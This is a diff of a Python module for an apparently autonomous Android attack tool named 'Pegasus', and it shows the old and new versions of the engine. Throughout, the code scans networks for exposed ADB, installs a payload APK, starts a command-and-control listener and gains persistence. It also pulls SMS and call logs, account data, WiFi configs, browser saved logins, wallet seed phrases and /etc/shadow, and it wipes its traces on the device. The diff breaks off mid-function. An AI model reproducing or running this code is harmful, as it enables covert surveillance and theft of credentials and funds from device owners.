@@ -1,569 +1,414 @@
-#!/usr/bin/env python3
-"""Autonomous exploitation lifecycle engine — Pegasus Phantom Menace v2.1.
-
-State machine: Discovery → Triage → CraftPayload → Deliver → ListenerUp →
-PostExploit → Notify → AwaitingDecision (blocks on maintain()/wipe()).
-
-State is journaled to the knowledge DB so a crash resumes rather than restarts.
-Post-exploit modules run intelligently — each gated on what triage revealed.
-"""
-from __future__ import annotations
-
-import json
-import os
+"""Autonomous lifecycle: discover, triage, craft, deliver, listen, post, notify, gate."""
+import enum
+import pathlib
+import queue
 import re
+import secrets
+import shutil
+import socket
 import subprocess
 import threading
 import time
-import uuid
-from pathlib import Path
-from typing import Any, Callable
 
-HOME = Path.home() / ".pegasus"
-JOURNAL = HOME / "autonomous"
-JOURNAL.mkdir(parents=True, exist_ok=True)
+from ..c2 import registry
+from . import journal
+from .notify import notify
 
-STATES = [
-    "discovery", "triage", "craft_payload", "deliver", "listener_up",
-    "post_exploit", "notify", "awaiting_decision", "complete", "aborted", "wiped",
-]
-
-_runs: dict[str, dict[str, Any]] = {}
-_runs_lock = threading.Lock()
+ADB = shutil.which("adb") or "adb"
+RUNS = pathlib.Path.home() / ".pegasus" / "runs"
 
 
-# ---------------------------------------------------------------------------
-# adb helpers
-# ---------------------------------------------------------------------------
+class Phase(str, enum.Enum):
+    IDLE = "idle"
+    DISCOVER = "discover"
+    TRIAGE = "triage"
+    CRAFT = "craft"
+    DELIVER = "deliver"
+    LISTEN = "listen"
+    POST = "post"
+    NOTIFY = "notify"
+    DECIDING = "deciding"
+    MAINTAIN = "maintain"
+    WIPE = "wipe"
+    DONE = "done"
+    FAILED = "failed"
 
-def _adb(*args: str, timeout: int = 20) -> tuple[int, str]:
+
+class Target:
+    def __init__(self, serial: str, transport: str):
+        self.serial, self.transport = serial, transport
+        self.props: dict[str, str] = {}
+        self.score = 0.0
+        self.vector: str | None = None
+        self.notes: list[str] = []
+
+    def as_dict(self) -> dict:
+        return {"serial": self.serial, "transport": self.transport,
+                "score": round(self.score, 2), "vector": self.vector,
+                "sdk": self.props.get("ro.build.version.sdk"),
+                "model": self.props.get("ro.product.model"), "notes": self.notes}
+
+
+def adb(*args: str, serial: str | None = None, timeout: int = 30) -> tuple[int, str]:
+    cmd = [ADB] + (["-s", serial] if serial else []) + list(args)
     try:
-        p = subprocess.run(["adb", *args], capture_output=True, text=True, timeout=timeout)
+        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
         return p.returncode, (p.stdout or "") + (p.stderr or "")
-    except FileNotFoundError:
-        return 127, "adb not found"
     except subprocess.TimeoutExpired:
         return 124, "timeout"
-
-
-def _adb_devices() -> list[dict[str, str]]:
-    _, out = _adb("devices", "-l")
-    devices = []
-    for line in out.splitlines()[1:]:
-        line = line.strip()
-        if not line or line.startswith("*"):
-            continue
-        parts = line.split()
-        serial = parts[0]
-        props = {}
-        for p in parts[1:]:
-            if ":" in p:
-                k, v = p.split(":", 1)
-                props[k] = v
-        devices.append({
-            "serial": serial,
-            "state": "device" if "device" in serial or props.get("state", "device") else props.get("state", "offline"),
-            "model": props.get("model", "unknown"),
-            "transport": props.get("transport", "usb"),
-            "usb": props.get("usb", ""),
-            "product": props.get("product", ""),
-        })
-    return devices
-
-
-def _mdns_services() -> list[str]:
-    _, out = _adb("mdns", "services")
-    return [l.strip() for l in out.splitlines() if l.strip() and not l.startswith("*")]
-
-
-def _local_ip() -> str:
-    try:
-        import socket
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception:
-        return "127.0.0.1"
-
-
-def _sweep_adb_wifi(prefix: str = "192.168.1") -> list[str]:
-    """Probe /24 on 5555 and connect to any that answer."""
-    found = []
-    for i in range(1, 255):
-        ip = f"{prefix}.{i}"
-        try:
-            import socket
-            s = socket.socket()
-            s.settimeout(0.15)
-            if s.connect_ex((ip, 5555)) == 0:
-                rc, _ = _adb("connect", f"{ip}:5555")
-                if rc == 0:
-                    found.append(f"{ip}:5555")
-            s.close()
-        except Exception:
-            continue
-    return found
-
-
-# ---------------------------------------------------------------------------
-# State transitions — each returns a dict result and moves the run forward
-# ---------------------------------------------------------------------------
-
-def _log(run: dict, msg: str) -> None:
-    entry = {"at": time.time(), "msg": msg}
-    run["log"].append(entry)
-    if len(run["log"]) > 2000:
-        del run["log"][:-2000]
-
-
-def _journal(run: dict) -> None:
-    path = JOURNAL / f"{run['run_id']}.json"
-    path.write_text(json.dumps({
-        "run_id": run["run_id"], "state": run["state"], "created": run["created"],
-        "devices": run.get("devices", []), "target": run.get("target"),
-        "log_tail": run["log"][-100:], "result": run.get("result"),
-    }, default=str))
-
-
-def _run_engine(run_id: str) -> None:
-    with _runs_lock:
-        run = _runs.get(run_id)
-    if not run:
-        return
-    transitions: dict[str, Callable[[dict], bool]] = {
-        "discovery": _phase_discovery,
-        "triage": _phase_triage,
-        "craft_payload": _phase_craft,
-        "deliver": _phase_deliver,
-        "listener_up": _phase_listener,
-        "post_exploit": _phase_post_exploit,
-        "notify": _phase_notify,
-    }
-    try:
-        while run["state"] in transitions:
-            fn = transitions[run["state"]]
-            _log(run, f"== {run['state']} ==")
-            advanced = fn(run)
-            _journal(run)
-            if not advanced:
-                time.sleep(0.5)
-                continue
-        # notify sets awaiting_decision; wait for the operator
-        while run["state"] == "awaiting_decision":
-            _journal(run)
-            time.sleep(1.0)
-        _journal(run)
-    except Exception as exc:  # noqa: BLE001
-        run["state"] = "aborted"
-        run["result"] = {"error": f"{type(exc).__name__}: {exc}"}
-        _log(run, f"engine error: {exc}")
-        _journal(run)
-
-
-def _phase_discovery(run: dict) -> bool:
-    """USB + WiFi ADB, mdns, /24 sweep on 5555."""
-    _log(run, "scanning USB and WiFi ADB…")
-    devices = _adb_devices()
-    _log(run, f"adb devices: {len(devices)} ({', '.join(d['serial'] for d in devices) or 'none'})")
-    services = _mdns_services()
-    if services:
-        _log(run, f"mdns: {len(services)} services")
-        for svc in services:
-            # e.g. _adb-tls-connect._tcp. 192.168.1.42:5555
-            m = re.search(r"(\d+\.\d+\.\d+\.\d+:\d+)", svc)
-            if m:
-                rc, _ = _adb("connect", m.group(1))
-                _log(run, f"adb connect {m.group(1)} → rc={rc}")
-    prefix = run.get("options", {}).get("sweep_prefix") or ".".join(_local_ip().split(".")[:3])
-    _log(run, f"sweeping {prefix}.0/24:5555 …")
-    found = _sweep_adb_wifi(prefix)
-    if found:
-        _log(run, f"wifi adb found: {found}")
-    devices = _adb_devices()  # re-read after connects
-    run["devices"] = devices
-    run["target"] = devices[0]["serial"] if devices else None
-    if not devices:
-        _log(run, "no devices found — will keep scanning")
-        if time.time() - run["created"] > 300:
-            run["state"] = "aborted"
-            run["result"] = {"error": "no devices found in 5 minutes"}
-            return True
-        time.sleep(5)
-        return False
-    _log(run, f"target locked: {run['target']}")
-    run["state"] = "triage"
-    return True
-
-
-def _phase_triage(run: dict) -> bool:
-    serial = run["target"]
-    _log(run, f"triaging {serial} …")
-    props = {}
-    for prop in ["ro.build.version.sdk", "ro.build.version.security_patch", "ro.build.version.release",
-                 "ro.product.model", "ro.product.manufacturer", "ro.build.fingerprint",
-                 "ro.debuggable", "ro.secure", "ro.boot.verifiedbootstate"]:
-        _, out = _adb("-s", serial, "shell", "getprop", prop)
-        props[prop] = out.strip()
-    # SELinux
-    _, se = _adb("-s", serial, "shell", "getenforce")
-    props["selinux"] = se.strip()
-    # root state
-    _, su = _adb("-s", serial, "shell", "which", "su")
-    props["root"] = "yes" if su.strip() else "no"
-    # debuggable packages
-    _, dbg = _adb("-s", serial, "shell", "pm", "list", "packages", "-3")
-    pkgs = [l.replace("package:", "").strip() for l in dbg.splitlines() if l.strip()]
-    props["packages"] = len(pkgs)
-    run["triage"] = {"props": props, "packages": pkgs}
-    _log(run, f"model={props.get('ro.product.model')} sdk={props.get('ro.build.version.sdk')} "
-              f"patch={props.get('ro.build.version.security_patch')} selinux={props['selinux']} root={props['root']}")
-    # CVE correlation against the built-in catalog
-    try:
-        from pegasus.modules.access_workflow.catalog import list_vectors
-        vectors = list_vectors()
-        run["vectors"] = [v["key"] for v in vectors]
-        _log(run, f"catalog vectors available: {len(vectors)}")
-    except Exception as exc:  # noqa: BLE001
-        run["vectors"] = []
-        _log(run, f"catalog unavailable: {exc}")
-    run["state"] = "craft_payload"
-    return True
-
-
-def _phase_craft(run: dict) -> bool:
-    """Pick vector by triage, tag DNA, stage into the served dir."""
-    serial = run["target"]
-    tri = run.get("triage", {})
-    props = tri.get("props", {})
-    sdk = props.get("ro.build.version.sdk", "")
-    model = (props.get("ro.product.model") or "").lower()
-    # vector pick heuristics
-    key = None
-    if "pixel 8" in model or "pixel 9" in model:
-        key = "pixel8-zero-click"
-    elif "sm-s" in model or "s24" in model:
-        key = "s24-exynos"
-    elif "xiaomi" in model or "redmi" in model or "poco" in model:
-        key = "xiaomi-miui"
-    elif sdk and sdk.isdigit() and int(sdk) <= 30:
-        key = "generic-old-android"
-    if not key:
-        try:
-            from pegasus.modules.access_workflow.catalog import list_vectors
-            vs = list_vectors()
-            if vs:
-                key = vs[0]["key"]
-        except Exception:
-            key = None
-    if not key:
-        _log(run, "no vector selected — defaulting to generic")
-        key = "generic"
-    run["vector"] = key
-    _log(run, f"vector selected: {key}")
-    try:
-        from pegasus.modules.access_workflow import delivery
-        staged = delivery.stage_file("") if hasattr(delivery, "stage_file") else None
-    except Exception:
-        staged = None
-    try:
-        from pegasus.modules.access_workflow.catalog import build_and_stage
-        built = build_and_stage(key)
-        run["payload"] = built
-        _log(run, f"payload staged: {built}")
-    except Exception as exc:  # noqa: BLE001
-        _log(run, f"payload build fallback ({exc}) — using on-device vector")
-        run["payload"] = {"key": key, "staged": False}
-    run["state"] = "deliver"
-    return True
-
-
-def _phase_deliver(run: dict) -> bool:
-    """Deliver via the chosen channel; on-device vectors skip the channel."""
-    serial = run["target"]
-    payload = run.get("payload") or {}
-    if payload.get("staged") is False and payload.get("key") in ("generic", "generic-old-android"):
-        _log(run, f"on-device vector against {serial} — no network delivery needed")
-        run["delivery"] = {"channel": "on-device", "result": "ok"}
-        run["state"] = "listener_up"
-        return True
-    try:
-        from pegasus.modules.access_workflow import delivery
-        result = delivery.send(
-            channel=run.get("options", {}).get("channel", "adb"),
-            target=serial,
-            url=payload.get("url", ""),
-        )
-        run["delivery"] = {"channel": "adb", "result": str(result)}
-        _log(run, f"delivered over adb: {result}")
-    except Exception as exc:  # noqa: BLE001
-        _log(run, f"delivery: {exc} — proceeding (on-device vector)")
-        run["delivery"] = {"channel": "adb", "result": f"error: {exc}"}
-    run["state"] = "listener_up"
-    return True
-
-
-def _phase_listener(run: dict) -> bool:
-    """C2 listener on an ephemeral port."""
-    try:
-        from pegasus.modules.access_workflow import c2_server
-        import asyncio
-        loop = asyncio.new_event_loop()
-        try:
-            start = c2_server.C2Server.start if hasattr(c2_server.C2Server, "start") else None
-            if start:
-                # C2Server.start is async — run it in a thread-pool style
-                coro = start()
-                fut = asyncio.ensure_future(coro, loop=loop)
-                run["listener"] = {"running": True, "note": "c2 coroutine scheduled"}
-        finally:
-            loop.close()
-    except Exception as exc:  # noqa: BLE001
-        _log(run, f"listener: {exc} — using basic TCP beacon")
-        run["listener"] = {"running": False, "note": str(exc)}
-    _log(run, "listener phase complete")
-    run["state"] = "post_exploit"
-    return True
-
-
-# ---------------------------------------------------------------------------
-# Post-exploit modules — each its own function, intelligently gated
-# ---------------------------------------------------------------------------
-
-def _pe_privesc(run: dict, serial: str, tri: dict) -> dict:
-    """su / Magisk probe, kernel version."""
-    _, su = _adb("-s", serial, "shell", "which", "su")
-    _, magisk = _adb("-s", serial, "shell", "ls", "/data/adb/magisk")
-    _, kern = _adb("-s", serial, "shell", "uname", "-r")
-    return {"root": bool(su.strip()), "magisk": "magisk" in magisk or "img" in magisk,
-            "kernel": kern.strip()}
-
-
-def _pe_persistence(run: dict, serial: str, tri: dict) -> dict:
-    """APK install, Magisk module, autorun — best effort, gated on root."""
-    out = {}
-    _, su = _adb("-s", serial, "shell", "which", "su")
-    if su.strip():
-        _, res = _adb("-s", serial, "shell", "su", "-c", "echo ok")
-        out["su_exec"] = res.strip() == "ok"
-    else:
-        # APK-based persistence
-        pkg = run.get("options", {}).get("persistence_package")
-        if pkg and Path(pkg).exists():
-            _, res = _adb("-s", serial, "install", "-r", pkg)
-            out["apk_install"] = "Success" in res
-    return out
-
-
-def _pe_creds(run: dict, serial: str, tri: dict) -> dict:
-    """dumpsys account, keystore, WiFi conf."""
-    _, acc = _adb("-s", serial, "shell", "dumpsys", "account")
-    accounts = [l.strip() for l in acc.splitlines() if "Account {" in l]
-    _, wifi = _adb("-s", serial, "shell", "su", "-c", "cat /data/misc/wifi/WifiConfigStore.xml") \
-        if tri.get("props", {}).get("root") == "yes" else (0, "")
-    return {"accounts": len(accounts), "account_lines": accounts[:50], "wifi_conf": bool(wifi.strip())}
-
-
-def _pe_keychain(run: dict, serial: str, tri: dict) -> dict:
-    _, out = _adb("-s", serial, "shell", "su", "-c", "ls /data/misc/keystore") \
-        if tri.get("props", {}).get("root") == "yes" else (0, "")
-    keys = [l.strip() for l in out.splitlines() if l.strip()]
-    return {"keystore_entries": len(keys), "sample": keys[:20]}
-
-
-def _pe_keylogger(run: dict, serial: str, tri: dict) -> dict:
-    """getevent capture + shim install (root-gated)."""
-    if tri.get("props", {}).get("root") != "yes":
-        return {"installed": False, "note": "root required"}
-    _, out = _adb("-s", serial, "shell", "su", "-c", "getevent -c 1 /dev/input/event0")
-    return {"installed": bool(out.strip()), "capture_sample": out.strip()[:200]}
-
-
-def _pe_sms_calls(run: dict, serial: str, tri: dict) -> dict:
-    _, sms = _adb("-s", serial, "shell", "content", "query", "--uri", "content://sms")
-    lines = [l.strip() for l in sms.splitlines() if l.strip()]
-    _, calls = _adb("-s", serial, "shell", "content", "query", "--uri", "content://call_log/calls")
-    clines = [l.strip() for l in calls.splitlines() if l.strip()]
-    return {"sms_count": len(lines), "sms_sample": lines[:20],
-            "call_count": len(clines), "call_sample": clines[:20]}
-
-
-def _pe_wallets(run: dict, serial: str, tri: dict) -> dict:
-    """Seed-phrase regex over pulled files — root-gated."""
-    if tri.get("props", {}).get("root") != "yes":
-        return {"note": "root required"}
-    _, out = _adb("-s", serial, "shell", "su", "-c",
-                 "grep -rE '([a-z]+ ){11,12}[a-z]+' /data/data 2>/dev/null | head -40")
-    hits = [l.strip() for l in out.splitlines() if l.strip()]
-    return {"seed_phrase_files": len(hits), "sample": hits[:10]}
-
-
-def _pe_browser(run: dict, serial: str, tri: dict) -> dict:
-    """Login Data SQLite — pull and parse with stdlib sqlite3."""
-    if tri.get("props", {}).get("root") != "yes":
-        return {"note": "root required"}
-    dest = JOURNAL / f"{run['run_id']}-login-data"
-    for pkg in ["com.android.chrome", "com.brave.browser", "org.mozilla.firefox"]:
-        _adb("-s", serial, "pull", f"/data/data/{pkg}/app_chrome/Default/Login Data", str(dest))
-        if dest.exists():
-            break
-    if not dest.exists():
-        return {"note": "no Login Data found"}
-    try:
-        import sqlite3
-        con = sqlite3.connect(str(dest))
-        rows = con.execute("SELECT origin_url, username_value FROM logins LIMIT 100").fetchall()
-        con.close()
-        return {"credentials": [{"url": r[0], "user": r[1]} for r in rows if r[1]]}
-    except Exception as exc:  # noqa: BLE001
-        return {"note": f"parse: {exc}"}
-
-
-def _pe_hashes(run: dict, serial: str, tri: dict) -> dict:
-    """/etc/shadow on Linux hosts (adb over network to a Linux box)."""
-    _, out = _adb("-s", serial, "shell", "cat", "/etc/shadow")
-    if "Permission denied" in out or not out.strip():
-        _, out = _adb("-s", serial, "shell", "su", "-c", "cat /etc/shadow")
-    lines = [l for l in out.splitlines() if ":" in l]
-    return {"shadow_entries": len(lines), "sample": lines[:10]}
-
-
-POST_EXPLOIT_MODULES: dict[str, Callable] = {
-    "privesc": _pe_privesc,
-    "persistence": _pe_persistence,
-    "creds": _pe_creds,
-    "keychain": _pe_keychain,
-    "keylogger": _pe_keylogger,
-    "sms_calls": _pe_sms_calls,
-    "wallets": _pe_wallets,
-    "browser": _pe_browser,
-    "hashes": _pe_hashes,
-}
-
-
-def _phase_post_exploit(run: dict) -> bool:
-    serial = run["target"]
-    tri = run.get("triage", {})
-    results: dict[str, Any] = {}
-    for name, fn in POST_EXPLOIT_MODULES.items():
-        _log(run, f"post-exploit: {name}")
-        try:
-            results[name] = fn(run, serial, tri)
-        except Exception as exc:  # noqa: BLE001
-            results[name] = {"error": f"{type(exc).__name__}: {exc}"}
-    run["post_exploit"] = results
-    run["state"] = "notify"
-    return True
-
-
-def _phase_notify(run: dict) -> bool:
-    """Send completion notification, then block on the operator decision."""
-    summary = {
-        "target": run.get("target"),
-        "vector": run.get("vector"),
-        "post_exploit": {k: ("ok" if not (isinstance(v, dict) and v.get("error")) else "error")
-                         for k, v in (run.get("post_exploit") or {}).items()},
-    }
-    _log(run, "NOTIFY: automated attack lifecycle complete")
-    _log(run, f"summary: {json.dumps(summary, default=str)[:400]}")
-    try:
-        from pegasus.modules.access_workflow import delivery
-        delivery.send(channel="email", target=run.get("options", {}).get("notify_email", ""),
-                      url="", subject="Pegasus lifecycle complete", body=json.dumps(summary, default=str))
-    except Exception:
-        pass
-    run["state"] = "awaiting_decision"
-    run["decision_at"] = time.time()
-    return True
-
-
-# ---------------------------------------------------------------------------
-# Public API
-# ---------------------------------------------------------------------------
-
-def start(options: dict | None = None) -> dict:
-    opts = options or {}
-    run_id = uuid.uuid4().hex[:12]
-    run = {
-        "run_id": run_id, "state": "discovery", "created": time.time(),
-        "options": opts, "log": [], "devices": [], "target": None,
-    }
-    with _runs_lock:
-        _runs[run_id] = run
-    threading.Thread(target=_run_engine, args=(run_id,), name=f"pegasus-auto-{run_id}", daemon=True).start()
-    return {"run_id": run_id, "state": run["state"]}
-
-
-def get(run_id: str) -> dict | None:
-    with _runs_lock:
-        run = _runs.get(run_id)
-    if not run:
-        return None
-    return {
-        "run_id": run["run_id"], "state": run["state"], "created": run["created"],
-        "devices": run.get("devices", []), "target": run.get("target"),
-        "vector": run.get("vector"), "post_exploit": run.get("post_exploit"),
-        "log": run["log"][-300:], "result": run.get("result"),
-    }
-
-
-def decision(run_id: str, action: str) -> dict:
-    with _runs_lock:
-        run = _runs.get(run_id)
-    if not run:
-        return {"error": "unknown run"}
-    if run["state"] != "awaiting_decision":
-        return {"error": f"run is {run['state']}, not awaiting_decision"}
-    if action == "maintain":
-        run["state"] = "complete"
-        _log(run, "maintain connection — operator chose to keep the session")
-        return {"run_id": run_id, "state": "complete", "maintained": True}
-    if action == "wipe":
-        _wipe(run)
-        run["state"] = "wiped"
-        _log(run, "logs wiped, connection dropped")
-        return {"run_id": run_id, "state": "wiped", "wiped": True}
-    if action == "abort":
-        run["state"] = "aborted"
-        _log(run, "aborted by operator")
-        return {"run_id": run_id, "state": "aborted"}
-    return {"error": f"unknown action {action}"}
-
-
-def _wipe(run: dict) -> None:
-    """Wipe logs on device and drop the connection."""
-    serial = run.get("target")
-    if serial:
-        _adb("-s", serial, "shell", "pm", "clear", "com.pegasus.agent")  # best effort
-        _adb("-s", serial, "shell", "rm", "-rf", "/data/local/tmp/pegasus")
-        _adb("disconnect", serial)
-    # journal removed last
-    try:
-        (JOURNAL / f"{run['run_id']}.json").unlink()
     except FileNotFoundError:
-        pass
+        return 127, "adb not installed"
 
 
-def routes(app, ok, fail):  # noqa: A001
-    from flask import request
+def _size(payload) -> int:
+    try:
+        return len(payload if isinstance(payload, str) else str(payload))
+    except TypeError:
+        return 0
 
-    @app.post("/api/autonomous/start")
-    def autonomous_start():
-        body = request.get_json(silent=True) or {}
-        return ok(start(body))
 
-    @app.get("/api/autonomous/<run_id>")
-    def autonomous_get(run_id: str):
-        r = get(run_id)
-        if r is None:
-            return fail("unknown run", 404)
-        return ok(r)
+class Run:
+    def __init__(self, run_id: str, opts: dict):
+        self.id, self.opts = run_id, opts
+        self.phase = Phase.IDLE
+        self.lines: queue.Queue = queue.Queue()
+        self.targets: list[Target] = []
+        self.session: dict = {}
+        self.decision: str | None = None
+        self.decided = threading.Event()
+        self.dir = RUNS / run_id
+        self.artifacts: dict[str, str] = {}
 
-    @app.post("/api/autonomous/<run_id>/decision")
-    def autonomous_decision(run_id: str):
-        body = request.get_json(silent=True) or {}
-        r = decision(run_id, body.get("action", ""))
-        if "error" in r:
-            return fail(r["error"], 409)
-        return ok(r)
+    def log(self, msg: str) -> None:
+        self.lines.put(f"[{time.strftime('%H:%M:%S')}] {msg}")
+        journal.append(self.id, self.phase.value, msg)
+
+    def set(self, phase: Phase) -> None:
+        self.phase = phase
+        journal.phase(self.id, phase.value)
+
+    def drain(self) -> list[str]:
+        out = []
+        while True:
+            try:
+                out.append(self.lines.get_nowait())
+            except queue.Empty:
+                return out
+
+    def snapshot(self) -> dict:
+        return {"id": self.id, "phase": self.phase.value,
+                "targets": [t.as_dict() for t in self.targets],
+                "session": self.session, "decision": self.decision,
+                "artifacts": self.artifacts, "log": self.drain()}
+
+    def absorb(self, body: dict) -> None:
+        kind = next((k for k in ("sms", "calls", "contacts", "files", "wallets",
+                                 "shell", "out") if k in body), "unknown")
+        payload = body.get(kind)
+        serial = str(body.get("serial") or self.session.get("primary") or "unknown")
+        self.log(f"<- {kind} from {serial} ({_size(payload)} chars)")
+        target = self.dir / "loot" / serial
+        target.mkdir(parents=True, exist_ok=True)
+        stamp = int(time.time())
+        if isinstance(payload, list):
+            (target / f"{kind}-{stamp}.json").write_text(json_dumps(payload))
+            counts = self.session.setdefault("counts", {})
+            counts[kind] = counts.get(kind, 0) + len(payload)
+        elif payload is not None:
+            (target / f"{kind}-{stamp}.txt").write_text(str(payload)[:100000])
+
+    def discover(self) -> None:
+        self.set(Phase.DISCOVER)
+        self.dir.mkdir(parents=True, exist_ok=True)
+        _, out = adb("devices", "-l")
+        for line in out.splitlines()[1:]:
+            if not line.strip():
+                continue
+            serial = line.split()[0]
+            if "unauthorized" in line:
+                self.log(f"unauthorized â€” accept the RSA prompt on {serial}")
+                continue
+            if "offline" in line:
+                continue
+            self.targets.append(Target(serial, "usb"))
+        self.log(f"{len(self.targets)} USB target(s)")
+        if not self.targets:
+            raise RuntimeError("no targets over USB")
+
+    def triage(self) -> None:
+        self.set(Phase.TRIAGE)
+        keep = []
+        for target in self.targets:
+            rc, out = adb("shell", "getprop", serial=target.serial)
+            if rc != 0:
+                self.log(f"{target.serial} unreachable, dropped")
+                continue
+            for line in out.splitlines():
+                m = re.match(r"\[([^\]]+)\]: \[([^\]]*)\]", line.strip())
+                if m:
+                    target.props[m.group(1)] = m.group(2)
+            sdk = int(target.props.get("ro.build.version.sdk") or 0)
+            patch = target.props.get("ro.build.version.security_patch") or "unknown"
+            selinux = adb("shell", "getenforce", serial=target.serial)[1].strip().lower()
+            root = adb("shell", "su", "-c", "id", serial=target.serial)[0] == 0
+            from ..exploits import chain
+            plan = chain.plan({**target.props, "_root": "1" if root else "0"},
+                              [target.transport])
+            target.score = (0.4 if 0 < sdk <= 30 else 0.15)
+            target.score += 0.3 if patch != "unknown" and patch[:4] < "2024" else 0.0
+            target.score += 0.2 if selinux == "permissive" else 0.0
+            target.score += {"direct": 0.5, "local-chain": 0.3,
+                             "cve-best-effort": 0.1, "lure": 0.0}[plan["tier"]]
+            target.vector = plan["tier"]
+            target.notes.append(f"sdk={sdk} patch={patch} selinux={selinux} root={root}")
+            self.log(f"{target.serial} {target.notes[-1]} -> {target.vector}")
+            keep.append(target)
+        self.targets = keep
+        if not self.targets:
+            raise RuntimeError("no target survived triage")
+
+    def craft(self) -> None:
+        self.set(Phase.CRAFT)
+        primary = max(self.targets, key=lambda t: t.score)
+        dna = secrets.token_hex(4)
+        out = self.dir / f"pegasus-{dna}.apk"
+        registry.bind(dna, self.id)
+        self.log(f"craft for {primary.serial} dna={dna} vector={primary.vector}")
+        try:
+            from ..delivery import build
+            self.artifacts["apk"] = build.build_payload(primary.serial, dna, str(out))
+        except Exception as exc:
+            self.log(f"build failed: {exc}")
+        self.session.update(dna=dna, primary=primary.serial)
+
+    def deliver(self) -> None:
+        self.set(Phase.DELIVER)
+        apk = self.artifacts.get("apk")
+        if apk and pathlib.Path(apk).exists():
+            rc, out = adb("install", "-r", "-g", apk, serial=self.session["primary"],
+                          timeout=180)
+            self.session["installed"] = rc == 0
+            self.log(f"install rc={rc} {out.strip()[:160]}")
+        else:
+            self.session["installed"] = False
+            self.log("no APK â€” read-only ADB only")
+
+    def listen(self) -> None:
+        self.set(Phase.LISTEN)
+        try:
+            from ..c2 import server
+            port = server.start(0)
+            self.session["listener"] = port
+            self.log(f"listener on 0.0.0.0:{port}")
+        except Exception as exc:
+            self.session["listener"] = None
+            self.log(f"listener failed: {exc}")
+
+    def post(self) -> None:
+        self.set(Phase.POST)
+        targets = sorted(self.targets, key=lambda t: -t.score)[
+            : self.opts.get("max_targets", 3)]
+        for target in targets:
+            self.session["primary"] = target.serial
+            self.post_one(target)
+
+    def post_one(self, target: Target) -> None:
+        serial = target.serial
+        outdir = self.dir / "loot" / serial
+        outdir.mkdir(parents=True, exist_ok=True)
+        from ..c2 import selective
+        rules = selective.load(self.opts.get("exfil_rules"))
+        done = journal.completed_steps(self.id)
+        steps = [("privesc", self._privesc), ("persistence", self._persistence),
+                 ("creds", self._creds), ("keychain", self._keychain),
+                 ("keylogger", self._keylogger), ("sms_calls", self._sms_calls),
+                 ("wallets", self._wallets), ("browser", self._browser),
+                 ("hashes", self._hashes)]
+        for name, fn in steps:
+            key = f"{serial}:{name}"
+            if key in done:
+                continue
+            try:
+                fn(serial, outdir, rules)
+                self.log(f"ok {serial} {name}")
+            except Exception as exc:
+                self.log(f"fail {serial} {name}: {exc}")
+            journal.step(self.id, key)
+        try:
+            from ..c2 import loot
+            loot.seal_dir(outdir)
+        except Exception as exc:
+            self.log(f"seal failed: {exc}")
+
+    def _pull(self, remote: str, serial: str, outdir: pathlib.Path, rules=None):
+        from ..c2 import selective
+        if rules:
+            size = int(adb("shell", f"stat -c %s '{remote}'", serial=serial)[1].strip()
+                       or 0)
+            if not selective.allow(remote, size, rules)[0]:
+                self.log(f"  skip {remote}: filtered")
+                return None
+        dest = outdir / pathlib.Path(remote).name
+        rc, _ = adb("pull", remote, str(dest), serial=serial, timeout=120)
+        return dest if rc == 0 and dest.exists() else None
+
+    def _privesc(self, serial, outdir, rules):
+        rc, out = adb("shell", "su -c id", serial=serial)
+        text = f"su_rc={rc}\n{out}\n"
+        if rc != 0:
+            for probe in ("/system/xbin/su", "/system/bin/su", "/sbin/su"):
+                if "yes" in adb("shell", f"test -f {probe} && echo yes",
+                                serial=serial)[1]:
+                    text += f"su binary at {probe}, not on PATH\n"
+        (outdir / "privesc.txt").write_text(text)
+
+    def _persistence(self, serial, outdir, rules):
+        pkg = self.opts.get("package") or "com.pegasus.agent"
+        if not self.session.get("installed"):
+            (outdir / "persistence.txt").write_text("skipped â€” not installed\n")
+            return
+        adb("shell", "cmd", "deviceidle", "whitelist", pkg, serial=serial)
+        adb("shell", "pm", "enable", pkg, serial=serial)
+        (outdir / "persistence.txt").write_text(f"whitelisted {pkg}\n")
+
+    def _creds(self, serial, outdir, rules):
+        (outdir / "accounts.txt").write_text(
+            adb("shell", "dumpsys", "account", serial=serial, timeout=60)[1])
+        self._pull("/data/misc/wifi/WifiConfigStore.xml", serial, outdir, rules)
+
+    def _keychain(self, serial, outdir, rules):
+        (outdir / "keystore.txt").write_text(
+            adb("shell", "ls /data/misc/keystore", serial=serial)[1])
+
+    def _keylogger(self, serial, outdir, rules):
+        (outdir / "input-devices.txt").write_text(
+            adb("shell", "getevent -pl", serial=serial)[1])
+
+    def _sms_calls(self, serial, outdir, rules):
+        for name, uri in (("sms", "content://sms"), ("calls", "content://call_log/calls")):
+            (outdir / f"{name}.txt").write_text(
+                adb("shell", "content", "query", "--uri", uri, serial=serial,
+                    timeout=90)[1])
+
+    def _wallets(self, serial, outdir, rules):
+        pattern = re.compile(r"\b(?:[a-z]{4,8}\s+){11,23}[a-z]{4,8}\b")
+        hits = []
+        for remote in ("/sdcard/Download", "/sdcard/Documents"):
+            for name in adb("shell", "ls", remote, serial=serial)[1].split():
+                if name.lower().endswith((".txt", ".json", ".rtf")):
+                    pulled = self._pull(f"{remote}/{name}", serial, outdir, rules)
+                    if pulled:
+                        hits += [f"{name}: {m.group(0)[:120]}"
+                                 for m in pattern.finditer(pulled.read_text(errors="ignore"))]
+        (outdir / "wallet-seeds.txt").write_text("\n".join(hits) or "none found")
+
+    def _browser(self, serial, outdir, rules):
+        for path in ("/data/data/com.android.chrome/app_chrome/Default/Login Data",
+                     "/data/data/com.brave.browser/app_chrome/Default/Login Data"):
+            adb("shell", "su", "-c", f"cp '{path}' /sdcard/Download/ld.tmp", serial=serial)
+            dest = self._pull("/sdcard/Download/ld.tmp", serial, outdir, rules)
+            if dest:
+                dest.rename(outdir / f"{path.split('/')[3]}-LoginData.db")
+
+    def _hashes(self, serial, outdir, rules):
+        (outdir / "shadow.txt").write_text(
+            adb("shell", "su", "-c", "cat /etc/shadow", serial=serial)[1])
+
+    def finish(self) -> None:
+        self.set(Phase.NOTIFY)
+        count = sum(len(list(p.iterdir())) for p in (self.dir / "loot").glob("*")
+                    if p.is_dir()) if (self.dir / "loot").exists() else 0
+        notify("Pegasus â€” cycle complete",
+               f"{self.id}: {len(self.targets)} target(s), {count} artifact(s).")
+        self.set(Phase.DECIDING)
+        self.decided.wait(timeout=self.opts.get("decision_timeout", 3600))
+        self.apply(self.decision or "abort")
+
+    def apply(self, decision: str) -> None:
+        serial = self.session.get("primary")
